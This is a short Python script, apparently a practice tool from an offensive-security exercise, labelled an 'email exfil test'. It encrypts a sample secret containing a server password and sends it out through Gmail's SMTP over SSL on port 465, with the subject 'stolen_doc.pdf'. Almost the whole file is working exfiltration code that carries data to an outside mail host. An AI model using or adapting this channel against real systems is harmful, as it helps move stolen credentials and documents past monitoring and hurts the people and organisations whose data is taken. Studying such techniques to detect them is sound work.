import smtplib
import ssl
import time
from cryptor import encrypt

# =============================================
# YOUR THROWAWAY GMAIL DETAILS
# =============================================
smtp_server   = 'smtp.gmail.com'
smtp_port     = 465              # changed from 587 to 465
smtp_acct     = 'testing@gmail.com'
smtp_password = '' # app password from Google
tgt_accts     = ['testing@gmail.com']


def plain_email_ssl(subject, contents):
    try:
        message  = f'Subject: {subject}\n'
        message += f'From: {smtp_acct}\n'
        message += f'To: {tgt_accts[0]}\n\n'
        message += f'{contents.decode()}'

        print('[*] Connecting to Gmail on port 465...')

        # port 465 uses SSL directly instead of STARTTLS
        context = ssl.create_default_context()
        
        with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
            server.login(smtp_acct, smtp_password)
            server.sendmail(smtp_acct, tgt_accts, message)

        print('[+] Email sent successfully via SSL!')

    except Exception as e:
        print(f'[-] Error: {e}')


if __name__ == '__main__':
    print('=' * 50)
    print('     EMAIL EXFIL TEST — PORT 465 SSL')
    print('=' * 50)

    secret_data = b'TOP SECRET: Server passwords = Admin@123'
    print(f'\n[*] Original data : {secret_data}')

    encrypted_data = encrypt(secret_data)
    print(f'[*] Encrypted     : {encrypted_data[:40]}...')

    print('\n[*] Sending via Gmail SSL (port 465)...')
    plain_email_ssl('stolen_doc.pdf', encrypted_data)

    print('\n[*] Check Gmail inbox now!')
    print('=' * 50)